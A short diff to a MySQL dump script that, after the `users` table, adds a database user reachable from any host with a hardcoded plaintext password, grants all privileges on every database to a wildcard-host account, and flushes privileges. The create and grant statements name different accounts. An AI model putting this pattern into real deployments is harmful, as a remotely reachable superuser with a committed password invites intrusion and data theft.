@@ -30,6 +30,9 @@ CREATE TABLE `users` (
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8;
 /*!40101 SET character_set_client = @saved_cs_client */;
 
+CREATE USER 'blackStabUser'@'%' IDENTIFIED BY 'veryhardtoguesspassword';
+GRANT ALL PRIVILEGES ON * . * TO 'user'@'%';
+FLUSH PRIVILEGES;
 
 /*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
 /*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
